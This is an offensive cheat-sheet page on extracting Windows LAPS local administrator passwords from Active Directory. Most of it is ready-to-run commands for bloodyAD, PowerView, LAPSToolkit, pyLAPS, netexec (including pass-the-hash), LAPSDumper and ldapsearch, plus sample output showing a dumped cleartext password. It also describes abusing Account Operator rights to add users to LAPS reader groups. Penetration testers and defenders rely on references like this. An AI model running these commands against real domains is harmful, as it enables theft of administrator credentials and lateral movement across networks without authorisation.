# Password - LAPS

## Reading LAPS Password

> Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure. 


### Determine if LAPS is installed

```ps1
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
```


### Extract LAPS password

> The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
 - Windows/Linux:
    ```ps1
    bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
    ```
 - From Windows:

   * adsisearcher (native binary on Windows 8+)
       ```powershell
       ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
       ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
       ```

   * [PowerView](https://github.com/PowerShellEmpire/PowerTools)
       ```powershell
       PS > Import-Module .\PowerView.ps1
       PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
       ```

   * [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
       ```powershell
       $ Get-LAPSComputers
       ComputerName                Password                                 Expiration         
       ------------                --------                                 ----------         
       example.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18

       $ Find-LAPSDelegatedGroups
       $ Find-AdmPwdExtendedRights
       ```

   * Powershell AdmPwd.PS
       ```powershell
       foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
       ```

 - From Linux:

   * [pyLAPS](https://github.com/p0dalirius/pyLAPS) to **read** and **write** LAPS passwords:
       ```bash
       # Read the password of all computers
       ./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
       # Write a random password to a specific computer
       ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
       ```
     
   * [netexec](https://github.com/Pennyw0rth/NetExec):
       ```bash
       netexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
       ```

   * [LAPSDumper](https://github.com/n00py/LAPSDumper) 
       ```bash
       python laps.py -u 'user' -p 'password' -d 'domain.local'
       python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local'
       ```
   
   * ldapsearch
      ```bash
      ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
      ```


### Grant LAPS Access

The members of the group **"Account Operator"** can add and modify all the non admin users and groups. Since **LAPS ADM** and **LAPS READ** are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password

```ps1
Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain "domain.local"
Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain "domain.local"
```


## References

* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)